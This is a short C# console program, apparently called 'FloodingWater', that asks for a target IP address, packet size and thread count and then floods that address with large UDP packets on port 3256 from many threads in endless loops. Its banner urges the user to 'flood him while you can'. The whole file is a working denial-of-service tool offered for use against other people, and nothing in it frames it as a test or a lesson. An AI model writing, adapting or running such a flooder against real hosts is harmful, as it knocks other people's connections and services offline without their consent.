using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Net;
using System.Threading;

namespace FloodingWater
{
    class Program
    {
    
        static void Main(string[] args)
        {
            string ip = "127.0.0.1";
            int pbytes = 1000;
            int threads = 50;
            while (true)
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("FLOODING WATER. FLOOD HIM WHILE YOU CAN.");
                Console.WriteLine("Loading....");
                Console.ForegroundColor = ConsoleColor.White;
                
                Console.WriteLine("IP: ");
                ip = Console.ReadLine();
                Console.WriteLine("Packet Size(in kilobytes): ");
                pbytes = int.Parse(Console.ReadLine());
                Console.WriteLine("AMOUNT OF THREADS: ");
                threads = int.Parse(Console.ReadLine());
                for(int i = 0;i<threads;i++)
                {
                    var t = new Thread(() => Flood(ip,pbytes));
                    t.Start();
                }
                Console.WriteLine("Write 'Q' to quit.");
                if (Console.ReadLine() == "Q")
                    break;
            }

        }
        
        static void Flood(string ip,int size)
        {
            int count = 0;
            while (true)
            {
                try
                {
                    byte[] pbytes = new byte[size * 1024];
                    IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), 3256);
                    SocketType st = new SocketType();
                    ProtocolType pt = new ProtocolType();
                    st = SocketType.Dgram;
                    pt = ProtocolType.Udp;
                    
                    Socket sock = new Socket(AddressFamily.InterNetwork, st, pt);
                    sock.SendTo(pbytes, ep);
                    count++;
                    Console.WriteLine("Sent {0} packets!",count);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error!,Make sure you put valid info");
                    break;
                }
            }
        }

        
    }
}
